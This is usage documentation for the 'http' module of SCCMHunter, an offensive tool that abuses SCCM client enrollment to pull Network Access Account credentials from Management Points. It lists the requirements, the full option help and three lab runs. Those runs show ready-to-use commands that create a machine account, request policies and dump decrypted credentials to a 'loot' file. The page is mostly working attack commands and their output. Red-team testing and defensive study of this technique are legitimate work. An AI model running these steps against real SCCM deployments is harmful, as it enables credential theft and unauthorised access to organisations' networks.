## Using the http module

### Description
The http module combines [Adam Chester's](https://github.com/xpn/sccmwtf) research and skelsec's [deobfuscator](https://github.com/xpn/sccmwtf/pull/3) to spoof standard client enrollment to recover Network Access Account credentials from discovered Management Points. 

-'NoneType' object has no attribute split

I've had multiple users send me messages related to this error during the registration and subsequent request. This was difficult to duplicate in a lab environment but my conclusion is this is due to the policy not being available due to factors like the SCCM database just being its slow self or user's executing commands through a proxy which will logically increase the amount of time needed to wait before requesting a policy. To combat this, you can either extend the amount of sleep time with the `-sleep` flag or record the registration guid and request the policy at a later time to whatever Management Point you successfully registred with with the `-mp` and `-uuid` flags. 

### Requirements

- Valid Active Directory credentials
- The ability to add a machine account or have possession of machine account credentials

### Usage


```
└─# python3 sccmhunter.py http -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -h              
SCCMHunter vdev0.0.3 by @garrfoster
                                                                                                                                                                                            
 Usage: sccmhunter http [OPTIONS] COMMAND [ARGS]...                                                                                                                                         
                                                                                                                                                                                            
 Abuse client enrollment.                                                                                                                                                                   
                                                                                                                                                                                            
╭─ Options ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│         -u            TEXT           Username [default: None]                                                                                                                            │
│         -p            TEXT           Password [default: None]                                                                                                                            │
│         -d            TEXT           Target domain [default: None]                                                                                                                       │
│         -dc-ip        TEXT           IP address or FQDN of domain controller [default: None]                                                                                             │
│         -ldaps                       Use LDAPS instead of LDAP                                                                                                                           │
│         -k                           Use Kerberos authentication                                                                                                                         │
│         -no-pass                     don't ask for password (useful for -k)                                                                                                              │
│         -hashes       LMHASH:NTHASH  LM and NT hashes, format is LMHASH:NTHASH [default: None]                                                                                           │
│         -aes          HEX KEY        AES key to use for Kerberos Authentication (128 or 256 bits) [default: None]                                                                        │
│         -debug                       Enable Verbose Logging                                                                                                                              │
│         -auto                        Attempt to create a machine and recover policies with provided credentials.                                                                         │
│         -cp           TEXT           Machine account password [default: None]                                                                                                            │
│         -cn           TEXT           Machine account name. [default: None]                                                                                                               │
│         -uuid         TEXT           UUID for manual request. [default: None]                                                                                                            │
│         -mp           TEXT           Management Point to manually request from [default: None]                                                                                           │
│         -sleep        TEXT           Time to wait between registering and requesting policies [default: 10]                                                                              │
│ --help  -h                           Show this message and exit.                                                                                                                         │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯


```

### Examples

#### Auto enrollment
```
└─# python3 sccmhunter.py http -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -auto
SCCMHunter vdev0.0.3 by @garrfoster
[19:25:31] INFO     [*] Searching for Management Points from database.                                                                                                                             
[19:25:32] INFO     [+] Found http://mp.internal.lab/ccm_system_windowsauth                                                                                                                        
[19:25:32] INFO     [+] Found http://sccm.internal.lab/ccm_system_windowsauth                                                                                                                      
[19:25:32] INFO     [+] Found http://sccm2.internal.lab/ccm_system_windowsauth                                                                                                                     
[19:25:33] INFO     [+] Found http://active.internal.lab/ccm_system_windowsauth                                                                                                                    
[19:25:33] INFO     [*] User selected auto. Attempting to add a machine account then request policies.                                                                                             
[19:25:36] INFO     [+] DESKTOP-KS233C4P$ created with password: K2bNRZJxE0lf                                                                                                                      
[19:25:36] INFO     [*] Attempting to grab policy from mp.internal.lab                                                                                                                             
[19:25:37] INFO     [*] Done.. our ID is 7FB2729E-0E61-4CB7-A74A-5AD3170F1A35                                                                                                                      
[19:25:37] INFO     [*] Waiting 10 seconds for database to update.                                                                                                                                 
[19:25:48] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
[19:25:48] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
[19:25:48] INFO     [+] Done.. decrypted policy dumped to /root/.sccmhunter/logs/loot/mp_naapolicy.xml 
```
#### Manual with creds

```
└─# python3 sccmhunter.py http -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -cn wikidemo\$ -cp P@ssw0rd 
SCCMHunter vdev0.0.3 by @garrfoster
[21:14:28] INFO     [*] Searching for Management Points from database.                                                                                                                             
[21:14:29] INFO     [+] Found http://mp.internal.lab/ccm_system_windowsauth                                                                                                                        
[21:14:30] INFO     [+] Found http://sccm.internal.lab/ccm_system_windowsauth                                                                                                                      
[21:14:31] INFO     [+] Found http://sccm2.internal.lab/ccm_system_windowsauth                                                                                                                     
[21:14:32] INFO     [+] Found http://active.internal.lab/ccm_system_windowsauth                                                                                                                    
[21:14:32] INFO     [*] Attempting to grab policy from mp.internal.lab                                                                                                                             
[21:14:34] INFO     [*] Done.. our ID is 7E7CC94B-E056-45C8-A2D9-03AD3114AE1F                                                                                                                      
[21:14:34] INFO     [*] Waiting 10 seconds for database to update.                                                                                                                                 
[21:14:45] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
[21:14:45] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
[21:14:45] INFO     [+] Done.. decrypted policy dumped to /root/.sccmhunter/logs/loot/mp_naapolicy.xml                                                                                             
                                                                                                                                                                                                   
```

#### Manually request policy

```
└─# python3 sccmhunter.py http -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -mp mp.internal.lab -uuid 7E7CC94B-E056-45C8-A2D9-03AD3114AE1F
SCCMHunter vdev0.0.3 by @garrfoster
[21:16:19] INFO     Submitting manual policy request from previous registration 7E7CC94B-E056-45C8-A2D9-03AD3114AE1F                                                                               
[21:16:20] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
[21:16:20] INFO     [+] Got NAA credential: lab\administrator:P@ssw0rd                                                                                                                             
[21:16:20] INFO     [+] Done.. decrypted policy dumped to /root/.sccmhunter/logs/loot/mp_naapolicy.xml 
```